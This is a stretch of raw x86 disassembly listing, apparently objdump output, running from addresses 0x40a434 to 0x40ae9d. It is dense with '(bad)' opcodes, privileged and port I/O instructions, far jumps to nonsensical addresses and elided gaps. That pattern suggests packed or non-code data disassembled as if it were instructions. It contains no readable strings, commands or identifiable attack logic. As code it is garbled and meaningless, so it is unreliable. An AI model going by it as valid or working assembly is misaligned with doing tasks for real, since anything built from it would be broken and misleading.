  40a434:	mov    edi,0x60ffe565
  40a439:	(bad)  
  40a43a:	add    WORD PTR [eax],ax
	...
  40a465:	add    bh,ah
  40a467:	je     0x40a427
  40a469:	push   0x3fcd1a
  40a46e:	xchg   DWORD PTR [ebp+esi*2-0x1acdf0f8],esp
  40a475:	push   DWORD PTR [eax-0x39]
  40a478:	data16 add dl,BYTE PTR [edi+0x4468be74]
  40a47f:	int    0x3f
  40a481:	add    bh,dl
  40a483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a484:	jne    0x40a48e
  40a486:	das    
  40a487:	push   cs
  40a488:	in     al,0xff
  40a48a:	xor    BYTE PTR [edi+0x1a],dh
  40a48d:	mov    esp,0xc2c9a430
  40a492:	outs   dx,DWORD PTR ds:[esi]
  40a493:	push   edi
  40a494:	push   ebp
  40a495:	mov    eax,DWORD PTR [ebx-0x28]
  40a498:	ret    
  40a499:	cld    
  40a49a:	mov    ebp,0x50096a57
  40a49f:	and    al,BYTE PTR [edi]
  40a4a1:	call   0x3f8ac9
  40a4a6:	into   
  40a4a7:	adc    bh,bl
  40a4a9:	push   0x4d
  40a4ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4ac:	jne    0x40a4b6
  40a4ae:	jg     0x40a487
  40a4b0:	(bad)  
  40a4b1:	inc    DWORD PTR [eax]
  40a4b3:	cmc    
  40a4b4:	and    edi,edi
  40a4b6:	push   0x4f
  40a4b8:	call   0xffe29533
  40a4bd:	push   0xfffffff3
  40a4bf:	mov    eax,ds:0xf2af0875
  40a4c4:	std    
  40a4c5:	push   DWORD PTR [eax+0xfc75a1]
	...
  40a4f3:	add    BYTE PTR [esi],bh
  40a4f5:	jmp    0x4b56acd1
  40a4fa:	popf   
  40a4fb:	(bad)  
  40a4fc:	stc    
  40a4fd:	retf   
  40a4fe:	inc    eax
  40a4ff:	add    al,0x3e
  40a501:	addr16 mov ebp,esp
  40a504:	push   esp
  40a505:	hlt    
  40a506:	jmp    0xd868:0x433890f
  40a50d:	ret    0xffc3
  40a510:	shl    BYTE PTR [edi-0x52],1
  40a513:	dec    eax
  40a514:	jg     0x40a50a
  40a516:	push   0xffffffd2
  40a518:	adc    BYTE PTR [ecx-0x3f81f4a2],0xf7
  40a51f:	dec    edi
  40a520:	mov    cl,0xc7
  40a522:	repnz (bad) 
  40a524:	xor    edi,eax
  40a526:	mov    dl,0xfe
  40a528:	sub    edi,esp
  40a52a:	push   0xffffff98
  40a52c:	mov    ds:0xdfe85e39,al
  40a531:	jge    0x40a591
  40a533:	call   DWORD PTR [esp+esi*8]
  40a536:	jmp    0x7868:0x2b2e90f
  40a53d:	loop   0x40a502
  40a53f:	(bad)  
  40a540:	fprem1 
  40a542:	add    al,BYTE PTR [eax]
  40a544:	mov    esi,0x61bea25c
  40a549:	icebp  
  40a54a:	or     al,al
  40a54c:	sar    dh,cl
  40a54e:	mov    dl,0xfe
  40a550:	retf   
  40a551:	add    ebx,DWORD PTR [ebp+esi*2+0x3a]
  40a555:	inc    esp
  40a556:	pop    ebp
  40a557:	jne    0x40a559
	...
  40a581:	add    BYTE PTR [esi],dh
  40a583:	sbb    al,0xeb
  40a585:	jecxz  0x40a5c0
  40a587:	sbb    DWORD PTR [edx+esi*2-0xb],ebp
  40a58b:	rcr    BYTE PTR [edi+edi*8-0x4d],0x24
  40a590:	pop    esp
  40a591:	jne    0x40a5c5
  40a593:	pushf  
  40a594:	pop    eax
  40a595:	push   esi
  40a596:	jg     0x40a5f3
  40a598:	jmp    0x919430f9
  40a59d:	and    BYTE PTR [edx],0x2
  40a5a0:	xchg   esi,eax
  40a5a1:	dec    ebx
  40a5a2:	cld    
  40a5a3:	dec    esi
  40a5a4:	jmp    0x6a2f6a5f
  40a5a9:	dec    eax
  40a5aa:	bnd je 0x40a596
  40a5ad:	jmp    0xc3ca7e9
  40a5b2:	(bad)  
  40a5b3:	(bad)  [eax]
  40a5b5:	pop    ebp
  40a5b6:	(bad)  
  40a5b8:	stos   DWORD PTR es:[edi],eax
  40a5b9:	pop    edi
  40a5ba:	pop    bx
  40a5bc:	jmp    0x36b32e2d
  40a5c1:	mov    dh,0x7e
  40a5c3:	pop    ebx
  40a5c4:	dec    esi
  40a5c5:	xlat   BYTE PTR ds:[ebx]
  40a5c6:	inc    ecx
  40a5c7:	repz enter 0xb15c,0x1
  40a5cc:	rol    DWORD PTR [edx],1
  40a5ce:	ds bnd jbe 0x40a5be
  40a5d2:	xchg   edi,eax
  40a5d3:	test   al,0xa8
  40a5d5:	add    ebx,DWORD PTR [ecx+0x6bf187]
  40a5db:	add    bl,BYTE PTR [esi]
  40a5dd:	pop    ebp
  40a5de:	mov    DWORD PTR [edi+0x530b5d15],eax
  40a5e4:	add    DWORD PTR [edi+0x0],esi
	...
  40a60f:	add    BYTE PTR [esi+0x7c4b0601],dh
  40a615:	push   esi
  40a616:	jmp    0x682f5ad1
  40a61b:	dec    eax
  40a61c:	xchg   BYTE PTR [ecx],cl
  40a61e:	out    dx,al
  40a61f:	pop    esp
  40a620:	retf   
  40a621:	xchg   edi,eax
  40a622:	in     eax,0xb3
  40a624:	push   eax
  40a625:	xchg   ebp,ebp
  40a627:	pop    esp
  40a628:	adc    esi,DWORD PTR [ecx-0x6be3ce0]
  40a62e:	add    ah,BYTE PTR [ebp+0x43f25b3e]
  40a634:	inc    ecx
  40a635:	(bad)  
  40a636:	mov    al,ds:0x5b3e02
  40a63b:	scas   al,BYTE PTR es:[edi]
  40a63c:	clc    
  40a63d:	or     BYTE PTR [eax],al
  40a63f:	jmp    0x2d080181
  40a644:	jbe    0x40a646
  40a646:	pop    es
  40a647:	jmp    0x3411b89
  40a64c:	cmp    dh,BYTE PTR [ebp+0x0]
  40a64f:	add    eax,DWORD PTR [edx-0x32]
  40a652:	inc    esp
  40a653:	jge    0x40a602
  40a655:	iret   
  40a656:	test   BYTE PTR [ebp-0x6e],dh
  40a659:	add    bh,bh
  40a65b:	sbb    DWORD PTR [ebx-0xf91077a],eax
  40a661:	add    al,0xe8
  40a663:	gs fwait
  40a665:	pop    ebx
  40a666:	add    dl,dh
  40a668:	jge    0x40a5f1
  40a66a:	add    eax,0x5a4640
  40a66f:	jmp    0xa8887919
	...
  40a69c:	add    BYTE PTR [eax],al
  40a69e:	cmp    eax,0x15ed7500
  40a6a3:	mov    ?,WORD PTR [esi-0x7454fdca]
  40a6a9:	sbb    eax,ecx
  40a6ab:	(bad)  
  40a6ac:	repz push ds
  40a6ae:	repnz dec DWORD PTR [edi-0x45]
  40a6b2:	adc    eax,0xe216be3e
  40a6b7:	rol    DWORD PTR [ecx+ebx*1+0x11ff0012],1
  40a6be:	out    dx,al
  40a6bf:	(bad)  
  40a6c0:	(bad)  
  40a6c1:	(bad)  
  40a6c2:	push   esi
  40a6c3:	add    BYTE PTR [edi-0x7e],ah
  40a6c6:	stos   BYTE PTR es:[edi],al
  40a6c7:	fwait
  40a6c8:	add    dh,ch
  40a6ca:	mov    bl,0xb
  40a6cc:	mul    esi
  40a6ce:	cmc    
  40a6cf:	push   DWORD PTR [edi+ecx*4]
  40a6d2:	jp     0x40a66f
  40a6d4:	add    cl,al
  40a6d6:	leave  
  40a6d7:	mov    ebp,0xd5cbcefe
  40a6dc:	jecxz  0x40a6de
  40a6de:	lock mov ds:0xf4176aff,eax
  40a6e4:	jnp    0x40a73d
  40a6e6:	push   esi
  40a6e7:	push   edi
  40a6e8:	push   DWORD PTR [ebp-0x5429]
  40a6ee:	fsubr  DWORD PTR [ecx-0x52]
  40a6f1:	dec    eax
  40a6f2:	push   esi
  40a6f3:	push   edi
  40a6f4:	call   0xffe5116e
  40a6f9:	mov    DWORD PTR [edx+0x73],esp
  40a6fc:	idiv   edi
  40a6fe:	mov    eax,0x67fef0
	...
  40a72b:	add    bl,dh
  40a72d:	int3   
  40a72e:	aas    
  40a72f:	add    BYTE PTR [eax-0x16],ch
  40a732:	out    dx,eax
  40a733:	imul   DWORD PTR [eax-0x5c]
  40a736:	push   DWORD PTR ds:0x400ea9
  40a73c:	outs   dx,DWORD PTR ds:[esi]
  40a73d:	int3   
  40a73e:	mov    ebx,0x84ce68ff
  40a743:	call   0x6b404b58
  40a748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a749:	repz test BYTE PTR [edi-0x2a],dl
  40a74d:	pop    ebx
  40a74e:	push   DWORD PTR [ebp-0x5399]
  40a754:	push   0xe648ae6a
  40a759:	pop    ebx
  40a75a:	call   0xffe49198
  40a75f:	mov    DWORD PTR [edx],edx
  40a761:	ja     0x40a75a
  40a763:	dec    DWORD PTR [eax-0x2e]
  40a766:	test   al,bl
  40a768:	jo     0x40a70e
  40a76a:	call   DWORD PTR [eax-0x31]
  40a76d:	mov    edx,DWORD PTR [edi+0x41]
  40a770:	push   edi
  40a771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a772:	mov    ch,0xf0
  40a774:	push   eax
  40a775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a776:	(bad)  
  40a777:	push   DWORD PTR [edx]
  40a779:	mov    ch,0x47
  40a77b:	inc    ecx
  40a77c:	push   edi
  40a77d:	jae    0x40a795
  40a77f:	mov    ebp,0xb5a293e
  40a784:	(bad)  
  40a785:	test   al,0xfd
  40a787:	xor    bl,0xbc
  40a78a:	push   ecx
  40a78b:	jmp    FWORD PTR [ecx]
  40a78d:	stc    
  40a78e:	iret   
  40a78f:	sldt   WORD PTR [eax]
	...
  40a7ba:	and    DWORD PTR ds:0xc5fa858a,eax
  40a7c0:	pop    ecx
  40a7c1:	jmp    FWORD PTR [esi-0x14]
  40a7c4:	gs mov ecx,0x146dde09
  40a7ca:	xor    eax,0x8e05ceb4
  40a7cf:	fdiv   QWORD PTR [ecx]
  40a7d1:	mov    ecx,0x8541d5f1
  40a7d6:	or     al,BYTE PTR [esi-0xbb400a6]
  40a7dc:	add    al,BYTE PTR [eax]
  40a7de:	mov    ebp,0xd1f75f2f
  40a7e3:	jne    0x40a7e8
  40a7e5:	je     0x40a84a
  40a7e7:	jno    0x40a781
  40a7e9:	in     al,dx
  40a7ea:	leave  
  40a7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ec:	pop    edx
  40a7ed:	add    BYTE PTR [edx],dh
  40a7ef:	mov    al,0x85
  40a7f1:	mov    ebp,0xff5a3da6
  40a7f6:	ds enter 0x67b5,0x3e
  40a7fb:	hlt    
  40a7fc:	imul   edi,DWORD PTR [esi-0x17f53867],0xff5a9de8
  40a806:	mov    DWORD PTR [edi+0x6581f767],esp
  40a80c:	pop    edx
  40a80d:	jne    0x40a855
  40a80f:	pop    esp
  40a810:	lods   eax,DWORD PTR ds:[esi]
  40a811:	mov    dh,0x71
  40a813:	push   ebp
  40a814:	pop    edx
  40a815:	mov    ch,0x56
  40a817:	add    eax,0x7f61ff59
  40a81c:	or     ebp,eax
	...
  40a846:	add    BYTE PTR [eax],al
  40a848:	mov    edx,0x51ff5a46
  40a84d:	pop    ebx
  40a84e:	pushf  
  40a84f:	pusha  
  40a850:	push   ecx
  40a851:	(bad)  
  40a852:	fstp   QWORD PTR [ecx-0x35]
  40a855:	push   edx
  40a856:	ror    DWORD PTR [edx+0x59cdfdf0],0xeb
  40a85d:	cli    
  40a85e:	mov    ebp,0x33fe2959
  40a863:	or     al,0x16
  40a865:	fstp   TBYTE PTR [esi+0x59]
  40a868:	sbb    esi,edi
  40a86a:	jae    0x40a8a4
  40a86c:	or     esi,edi
  40a86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a86f:	pop    ecx
  40a870:	xchg   ebx,eax
  40a871:	push   ebx
  40a872:	xchg   ecx,eax
  40a873:	hlt    
  40a874:	retf   
  40a875:	std    
  40a876:	xchg   ebp,eax
  40a877:	pop    ecx
  40a878:	mov    bl,0xf6
  40a87a:	xchg   ebp,eax
  40a87b:	pop    ecx
  40a87c:	icebp  
  40a87d:	repnz sbb al,0x9b
  40a880:	jmp    0xd2d02682
  40a885:	add    eax,0x93e65976
  40a88a:	xor    BYTE PTR [ecx-0x2f],bl
  40a88d:	std    
  40a88e:	fwait
  40a88f:	ins    BYTE PTR es:[edi],dx
  40a890:	sar    ebp,1
  40a892:	pop    ebp
  40a893:	ins    BYTE PTR es:[edi],dx
  40a894:	add    ah,al
  40a896:	push   ebp
  40a897:	pop    ecx
  40a898:	mov    ecx,0xb15148c7
  40a89d:	std    
  40a89e:	push   eax
  40a89f:	adc    eax,0x593dfde7
  40a8a4:	jmp    0x40a8b0
  40a8a6:	ds pop ecx
  40a8a8:	cdq    
  40a8a9:	repnz add BYTE PTR [ebx+0x0],bl
	...
  40a8d4:	add    BYTE PTR [eax],al
  40a8d6:	xchg   ecx,eax
  40a8d7:	std    
  40a8d8:	and    eax,0xd5f391bf
  40a8dd:	pop    ecx
  40a8de:	cmp    ebp,0xf275cf15
  40a8e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e5:	sahf   
  40a8e6:	ds pop ebx
  40a8e8:	xor    BYTE PTR [esi+0x36],al
  40a8eb:	pop    ebx
  40a8ec:	xchg   esp,eax
  40a8ed:	mov    WORD PTR [edx-0x27],ss
  40a8f0:	jmp    FWORD PTR [edx+edi*8]
  40a8f3:	jo     0x40a8f5
  40a8f5:	add    DWORD PTR [edx-0x2],0x74
  40a8f9:	icebp  
  40a8fa:	aad    0x40
  40a8fc:	mov    dh,0xde
  40a8fe:	out    0xd3,al
  40a900:	inc    esp
  40a901:	aad    0xc0
  40a903:	xchg   esi,eax
  40a904:	clc    
  40a905:	cmp    DWORD PTR [edx],esp
  40a907:	sub    eax,0x73422857
  40a90c:	sbb    al,0x16
  40a90e:	std    
  40a90f:	cld    
  40a910:	std    
  40a911:	cld    
  40a912:	out    0x93,eax
  40a914:	inc    ecx
  40a915:	jmp    0xa6fba6bf
  40a91a:	push   ax
  40a91c:	rcl    BYTE PTR ds:0xe8688d0f,0x3d
  40a923:	in     al,dx
  40a924:	mov    ebp,0x5005008e
  40a929:	xchg   al,bh
  40a92b:	push   esp
  40a92c:	call   0xff3cd0a2
  40a931:	or     DWORD PTR [edx-0x4791013d],0xb9f896
	...
  40a963:	add    ch,dl
  40a965:	cmp    eax,0x733da857
  40a96a:	sbb    al,0xbe
  40a96c:	jl     0x40a96a
  40a96e:	std    
  40a96f:	adc    al,0xe4
  40a971:	xchg   ebx,eax
  40a972:	inc    ecx
  40a973:	jmp    0x3efbba8d
  40a978:	push   es
  40a979:	push   eax
  40a97a:	sar    BYTE PTR [ebp-0x14977372],0x3d
  40a981:	in     al,dx
  40a982:	mov    ebp,0x50047826
  40a987:	push   ds
  40a988:	jo     0x40a9de
  40a98a:	call   0xff3ce14c
  40a98f:	add    esi,ebp
  40a991:	ret    0xfe
  40a994:	inc    eax
  40a995:	lock dec ebp
  40a997:	push   edi
  40a998:	xchg   esi,eax
  40a999:	pop    eax
  40a99a:	push   DWORD PTR [ebp+0x5f]
  40a99d:	jo     0x40aa16
  40a99f:	std    
  40a9a0:	pusha  
  40a9a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a2:	push   DWORD PTR [ebp+0x63]
  40a9a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a6:	jne    0x40a9b0
  40a9a8:	outs   dx,DWORD PTR ds:[esi]
  40a9a9:	mov    ds:0x8e10ffb5,al
  40a9ae:	ret    0x2704
  40a9b1:	retf   
  40a9b2:	mov    esp,ebp
  40a9b4:	xchg   esi,eax
  40a9b5:	fdivr  st(7),st
  40a9b8:	loopne 0x40a95d
  40a9ba:	lea    eax,[ebp-0x2d]
  40a9bd:	(bad)  
  40a9be:	std    
  40a9bf:	jne    0x40a9b4
  40a9c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9c2:	xor    eax,0xff164fae
  40a9c7:	out    0x0,eax
	...
  40a9f1:	add    BYTE PTR [ebp-0x23000045],al
  40a9f7:	xchg   edi,eax
  40a9f8:	jne    0x40ffa4
  40a9fe:	cwde   
  40a9ff:	sbb    edi,esi
  40aa01:	add    bh,dl
  40aa03:	push   edi
  40aa04:	add    bh,al
  40aa06:	sub    ch,BYTE PTR [ebx+0x57e707ff]
  40aa0c:	push   0x0
  40aa0e:	in     eax,dx
  40aa0f:	push   edi
  40aa10:	push   0x0
  40aa12:	in     eax,dx
  40aa13:	push   edi
  40aa14:	lea    eax,[ebp+0x1b]
  40aa17:	(bad)  
  40aa18:	mov    eax,DWORD PTR [ebp-0x73f5]
  40aa1e:	(bad)  
  40aa1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa20:	jne    0x40aa1a
  40aa22:	pusha  
  40aa23:	sub    bh,bl
  40aa25:	call   0x4085b5
  40aa2a:	pushf  
  40aa2b:	xchg   edi,eax
  40aa2c:	je     0x40aa33
  40aa2e:	fild   DWORD PTR cs:[eax]
  40aa31:	add    BYTE PTR [edi+0x3e4888ef],dl
  40aa37:	mov    bl,0x2
  40aa39:	(bad)  
  40aa3a:	jmp    0x40aa59
  40aa3c:	imul   esi,DWORD PTR [ebp+0x505754a5],0xffffffb5
  40aa43:	popa   
  40aa44:	mov    DWORD PTR [ebp-0xaa03ae],eax
  40aa4a:	out    dx,al
  40aa4b:	fild   QWORD PTR [edx-0x5b]
  40aa4e:	test   esp,esi
  40aa50:	push   ebp
  40aa51:	mov    DWORD PTR [ebx+0xff4e21],edi
	...
  40aa7f:	add    BYTE PTR [ecx],bh
  40aa81:	sbb    eax,0x2a31b75a
  40aa86:	jmp    0xae114c8a
  40aa8b:	inc    eax
  40aa8c:	ds mov ecx,0xb211f08f
  40aa92:	push   ebp
  40aa93:	dec    DWORD PTR [ebx+0x7a]
  40aa96:	retf   
  40aa97:	inc    eax
  40aa98:	ds int3 
  40aa9a:	pop    ecx
  40aa9b:	mov    edx,0x858bda01
  40aaa0:	loop   0x40aa7b
  40aaa2:	push   ebp
  40aaa3:	jmp    DWORD PTR [esp+eax*1-0x15]
  40aaa7:	xchg   esp,eax
  40aaa8:	xchg   ecx,eax
  40aaa9:	inc    ebx
  40aaaa:	add    al,0xff
  40aaac:	stos   DWORD PTR es:[edi],eax
  40aaad:	je     0x40aafd
  40aaaf:	(bad)  
  40aab0:	fnstenv [ecx+0x10]
  40aab3:	scas   al,BYTE PTR es:[edi]
  40aab4:	xchg   BYTE PTR [ebx+0x4],al
  40aab7:	call   0xff9669a7
  40aabc:	mov    bh,0x7f
  40aabe:	idiv   DWORD PTR [bx+di-0x166f]
  40aac3:	call   FWORD PTR [ecx]
  40aac5:	mov    ch,BYTE PTR [esi-0x6f5ec1c0]
  40aacb:	lock test eax,0x53ff5639
  40aad1:	loop   0x40aa9d
  40aad3:	inc    eax
  40aad4:	ds pushf 
  40aad6:	xchg   esi,eax
  40aad7:	mov    edx,0x8c265b89
  40aadc:	mov    ebx,0x795615fb
  40aae1:	test   ecx,ebp
  40aae3:	jmp    0x40aae5
	...
  40ab0d:	add    BYTE PTR [edx+edx*4-0x4f96fc58],bl
  40ab14:	clc    
  40ab15:	dec    ebp
  40ab16:	popa   
  40ab17:	cli    
  40ab18:	std    
  40ab19:	push   gs
  40ab1b:	mov    ds:0xbc6603a8,eax
  40ab20:	xor    dl,BYTE PTR [esi+0x49]
  40ab23:	in     al,0x6b
  40ab25:	ins    BYTE PTR es:[edi],dx
  40ab26:	dec    ecx
  40ab27:	cli    
  40ab28:	fucomp st(2)
  40ab2a:	cmp    DWORD PTR [edx+0x5b7ead9c],eax
  40ab30:	into   
  40ab31:	(bad)  
  40ab32:	repnz lds edx,FWORD PTR cs:[ebp+0x21]
  40ab37:	xor    BYTE PTR [edi-0x3ea48134],cl
  40ab3d:	adc    esp,0xc38badf9
  40ab43:	push   ss
  40ab44:	sahf   
  40ab45:	push   ebp
  40ab46:	add    esi,ebx
  40ab48:	pop    ebx
  40ab49:	pusha  
  40ab4a:	icebp  
  40ab4b:	stc    
  40ab4c:	xchg   ebp,eax
  40ab4d:	add    al,0x6a
  40ab4f:	sub    BYTE PTR [edx-0x69],0xda
  40ab53:	icebp  
  40ab54:	test   DWORD PTR [ebp+0x3e],edx
  40ab57:	outs   dx,DWORD PTR ds:[esi]
  40ab58:	sbb    eax,0x7e029b81
  40ab5d:	push   ebp
  40ab5e:	rcr    DWORD PTR [edx-0xb],1
  40ab61:	mov    al,0x61
  40ab63:	pop    ebx
  40ab64:	jmp    0xd43a2bcd
  40ab69:	or     esp,DWORD PTR [esi-0x4eaa65f8]
  40ab6f:	stc    
  40ab70:	xchg   ebx,eax
  40ab71:	push   0x0
	...
  40ab9a:	add    BYTE PTR [eax],al
  40ab9c:	mov    cl,0xf9
  40ab9e:	inc    ebp
  40ab9f:	push   ebp
  40aba0:	sub    esp,DWORD PTR [ebx+0x51]
  40aba3:	ret    0xf9cd
  40aba6:	push   DWORD PTR ds:0x36e7afeb
  40abac:	repz stc 
  40abae:	(bad)  
  40abaf:	pushf  
  40abb0:	xor    eax,0x13553403
  40abb5:	cli    
  40abb6:	(bad)  
  40abb7:	pop    esp
  40abb8:	fdivrp st(1),st
  40abba:	dec    BYTE PTR [esi]
  40abbc:	adc    esi,DWORD PTR [eax+0x8]
  40abbf:	adc    DWORD PTR [eax-0x51],eax
  40abc2:	(bad)  
  40abc3:	(bad)  
  40abc4:	repnz scas eax,DWORD PTR es:[edi]
  40abc6:	(bad)  
  40abc8:	jmp    0x1803:0x3574fef9
  40abcf:	popf   
  40abd0:	jmp    0xfef0:0x7194fef9
  40abd7:	(bad)  
  40abd8:	mov    ch,BYTE PTR [esi+0x8]
  40abdb:	shl    DWORD PTR [edi],0xaf
  40abde:	inc    dh
  40abe0:	mov    ch,BYTE PTR [esi-0x78d491d]
  40abe6:	out    0xc5,eax
  40abe8:	ret    
  40abe9:	clc    
  40abea:	(bad)  
  40abeb:	scas   al,BYTE PTR es:[edi]
  40abec:	mov    eax,0x6aa6f707
  40abf1:	add    esp,ecx
  40abf3:	push   edi
  40abf4:	xchg   edx,eax
  40abf5:	clc    
  40abf6:	(bad)  
  40abf7:	pop    esp
  40abf8:	lock dec BYTE PTR gs:[esi-0x7949eeab]
	...
  40ac28:	add    BYTE PTR [eax],al
  40ac2a:	mov    bh,al
  40ac2c:	mov    ah,0x89
  40ac2e:	mov    bh,al
  40ac30:	inc    BYTE PTR [ecx+0x6efeb186]
  40ac36:	jb     0x40abe6
  40ac38:	fistp  DWORD PTR [esi+0x6a]
  40ac3b:	clc    
  40ac3c:	out    0x29,eax
  40ac3e:	retf   
  40ac3f:	clc    
  40ac40:	(bad)  
  40ac41:	push   esi
  40ac42:	shr    bl,0xf6
  40ac45:	dec    esi
  40ac46:	adc    bh,al
  40ac48:	je     0x40ac4a
  40ac4a:	scas   eax,DWORD PTR es:[edi]
  40ac4b:	test   BYTE PTR [edi],dh
  40ac4d:	(bad)  
  40ac4e:	pop    eax
  40ac4f:	(bad)  
  40ac50:	push   DWORD PTR [ebp-0x58a9]
  40ac56:	call   esi
  40ac58:	mov    ch,0xff
  40ac5a:	pop    eax
  40ac5b:	pop    DWORD PTR [ebp-0x8]
  40ac5e:	dec    esi
  40ac5f:	push   ds
  40ac60:	std    
  40ac61:	dec    DWORD PTR [eax-0x71]
  40ac64:	jne    0x40ac62
  40ac66:	aas    
  40ac67:	fwait
  40ac68:	mov    ds:0xc2a55700,al
  40ac6d:	or     BYTE PTR [edi-0x37],ah
  40ac70:	mov    esp,ebp
  40ac72:	in     al,0x37
  40ac74:	cld    
  40ac75:	push   0x57
  40ac77:	add    cl,BYTE PTR [ebx]
  40ac79:	jmp    edx
  40ac7b:	mul    dh
  40ac7d:	mov    ecx,0x89ff8bd4
  40ac82:	bound  ecx,QWORD PTR [ebx+0x1e70c168]
  40ac88:	(bad)  
  40ac89:	(bad)  
  40ac8a:	(bad)  
  40ac8b:	mul    esi
  40ac8d:	test   BYTE PTR [eax],0x0
	...
  40acb8:	fimul  DWORD PTR [ebx-0x74ad0001]
  40acbe:	push   DWORD PTR [ebp+0x1f]
  40acc1:	xchg   esp,eax
  40acc2:	in     al,0xb3
  40acc4:	fmul   DWORD PTR [ebx+0x5be3c2c9]
  40acca:	push   ebp
  40accb:	mov    edi,DWORD PTR [ebx-0x2f2f3c23]
  40acd1:	mov    edi,edi
  40acd3:	lea    edx,[edx]
  40acd5:	mov    edx,DWORD PTR [eax-0x1]
  40acd8:	shl    bh,cl
  40acda:	std    
  40acdb:	xor    eax,0x3fb779
  40ace0:	mov    edi,0xd700a125
  40ace5:	clc    
  40ace6:	mov    esi,0x269220f
  40aceb:	add    BYTE PTR [esi],bh
  40aced:	add    cl,BYTE PTR [edx+0x45]
  40acf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acf1:	add    DWORD PTR [ebx],eax
  40acf3:	add    BYTE PTR [esi],bh
  40acf5:	dec    ecx
  40acf6:	leave  
  40acf7:	repz cdq 
  40acf9:	add    BYTE PTR [ebx],al
  40acfb:	add    BYTE PTR [edx+eax*1],ah
  40acfe:	(bad)  
  40ad00:	pop    ss
  40ad01:	add    bl,ch
  40ad03:	push   DWORD PTR [edx-0x34afa93a]
  40ad09:	jle    0x40ad63
  40ad0b:	div    DWORD PTR [ecx+0x50]
  40ad0e:	mov    ah,0xfe
  40ad10:	repz dec ecx
  40ad12:	push   ebx
  40ad13:	jne    0x40ad77
  40ad15:	dec    ecx
  40ad16:	mov    edi,0xfe023ea1
  40ad1b:	mov    edi,0x0
	...
  40ad44:	add    BYTE PTR [eax],al
  40ad46:	retf   0x5c06
  40ad49:	std    
  40ad4a:	aas    
  40ad4b:	add    al,BYTE PTR [ebx]
  40ad4d:	push   0xffc529b4
  40ad52:	cmp    BYTE PTR [eax-0x342d1800],dl
  40ad58:	push   ecx
  40ad59:	push   DWORD PTR [ebp+0x2a857fb4]
  40ad5f:	mov    dh,0x51
  40ad61:	jmp    FWORD PTR [esi+0x52]
  40ad64:	pop    esp
  40ad65:	loope  0x40ad3e
  40ad67:	lods   eax,DWORD PTR ds:[esi]
  40ad68:	push   ecx
  40ad69:	mov    ebx,eax
  40ad6b:	mov    ah,0x59
  40ad6d:	inc    DWORD PTR [ecx]
  40ad6f:	dec    ebx
  40ad70:	add    al,0x68
  40ad72:	pop    ebx
  40ad73:	pushf  
  40ad74:	vlddqu ymm2,[edi-0x1a1608ad]
  40ad7c:	push   ecx
  40ad7d:	xor    eax,0xffc52c90
  40ad82:	loope  0x40ad50
  40ad84:	mov    bh,bh
  40ad86:	sar    DWORD PTR [ebx-0x78],1
  40ad89:	in     al,0xd1
  40ad8b:	test   DWORD PTR [edx+0x6a],edx
  40ad8e:	ds pop ebx
  40ad90:	rol    DWORD PTR [ecx],1
  40ad92:	push   ss
  40ad93:	pushf  
  40ad94:	jmp    0x5e2c98eb
  40ad99:	push   edx
  40ad9a:	test   eax,0xf6a213f6
  40ad9f:	fwait
  40ada0:	jmp    0x3df43200
  40ada5:	push   edx
  40ada6:	(bad)  
  40ada7:	loopne 0x40aded
  40ada9:	pop    edx
	...
  40add2:	add    BYTE PTR [eax],al
  40add4:	mov    esi,esi
  40add6:	ret    0x1603
  40add9:	dec    edx
  40adda:	rol    esp,0x79
  40addd:	cmc    
  40adde:	push   ebx
  40addf:	push   ebx
  40ade0:	imul   esi,esi,0xc5335215
  40ade6:	mov    al,ds:0x54fe61c4
  40adeb:	mov    ebx,DWORD PTR [ecx-0xa]
  40adee:	outs   dx,DWORD PTR ds:[esi]
  40adef:	mov    BYTE PTR [esi-0x12],ah
  40adf2:	cmc    
  40adf3:	push   ecx
  40adf4:	aam    0x5a
  40adf6:	and    DWORD PTR [ebx],0x50e99be6
  40adfc:	repz jmp 0xa21b:0xf63151d5
  40ae04:	jbe    0x40ada2
  40ae06:	jmp    0xc5f35e66
  40ae0b:	push   ecx
  40ae0c:	(bad)  
  40ae0d:	(bad)  
  40ae0f:	pop    ecx
  40ae10:	adc    esi,esi
  40ae12:	arpl   WORD PTR [edi+0x51adedf2],ax
  40ae18:	outs   dx,BYTE PTR ds:[esi]
  40ae19:	add    DWORD PTR [ecx],0xffffffac
  40ae1c:	jle    0x40ae79
  40ae1e:	sahf   
  40ae1f:	xchg   edi,eax
  40ae20:	out    dx,al
  40ae21:	in     eax,dx
  40ae22:	xchg   ebp,eax
  40ae23:	push   ecx
  40ae24:	jmp    0x7efced58
  40ae29:	pop    ebx
  40ae2a:	xchg   ecx,eax
  40ae2b:	fst    QWORD PTR [ecx-0x6e02820b]
  40ae31:	outs   dx,BYTE PTR ds:[esi]
  40ae32:	add    al,dl
  40ae34:	ret    0xd3b7
  40ae37:	jbe    0x40ae39
	...
  40ae61:	add    BYTE PTR [edi-0xa],ch
  40ae64:	add    ebx,esp
  40ae66:	lods   eax,DWORD PTR ds:[esi]
  40ae67:	hlt    
  40ae68:	das    
  40ae69:	outs   dx,BYTE PTR ds:[esi]
  40ae6a:	mov    ecx,0xf56f716
  40ae6f:	mov    ebp,eax
  40ae71:	adc    ecx,ecx
  40ae73:	cmc    
  40ae74:	(bad)  
  40ae75:	push   edx
  40ae76:	xchg   esi,eax
  40ae77:	pusha  
  40ae78:	shl    BYTE PTR [ebp+0x5e88b47],0xb1
  40ae7f:	cmc    
  40ae80:	(bad)  
  40ae81:	es mov ecx,0xf26f716
  40ae87:	push   eax
  40ae88:	add    cl,ch
  40ae8a:	cmp    eax,0x73984e8
  40ae8f:	idiv   dh
  40ae91:	mov    ecx,0xa8583e85
  40ae96:	cmp    eax,0xf6f9b4f6
  40ae9b:	cmc    
  40ae9c:	(bad)  
  40ae9d:	div    BYTE PTR [eax]
